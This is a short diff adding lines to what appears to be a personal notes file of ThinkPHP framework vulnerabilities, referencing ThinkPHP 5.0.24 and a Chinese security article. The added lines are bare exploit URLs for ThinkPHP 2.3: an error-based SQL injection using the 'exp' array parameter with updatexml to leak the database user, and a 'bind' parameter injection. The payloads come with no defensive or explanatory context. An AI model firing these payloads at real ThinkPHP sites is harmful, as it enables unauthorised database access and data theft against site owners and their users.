@@ -61,4 +61,13 @@ thinkphp5.0.24    --http://cn-sec.com/archives/77514.html
 
 
 
+ThinkPHP.2.3
+/ThinkPHP/?id=1
+/ThinkPHP/index.php?username[0]=exp&username[1]==1 and updatexml(1,concat(0x7e,user(),0x7e),1)
+/ThinkPHP/index.php?id[0]=bind&id[1]=aa&password=1
+
+
+
+
+
 
